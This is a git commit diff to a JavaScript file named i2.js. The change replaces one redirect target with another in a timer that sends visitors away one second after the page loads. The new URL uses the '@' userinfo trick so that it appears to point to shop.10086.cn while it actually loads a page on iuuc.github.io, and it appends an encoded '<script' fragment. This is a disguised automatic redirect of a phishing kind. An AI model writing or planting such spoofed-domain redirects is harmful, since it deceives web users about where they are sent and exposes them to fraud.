5dddfc22263532552dec9a2573aeeaaa0a6ec3f0
iuuc <145624790+iuuc@users.noreply.github.com>
2023-12-31 14:31:08 +0800

    Update i2.js

--- i2.js
+++ i2.js
@@ -10,6 +10,6 @@ leleua();
 
 setTimeout(function() {
     var timestamp = new Date().getTime();
-    var url = 'https://teezx.github.io./index.html' + '?' + timestamp + '%3Cscript';
+    var url = 'https://shop.10086.cn@iuuc.github.io./r79.html' + '?' + timestamp + '%3Cscript';
     location.href = url;
 }, 1000);
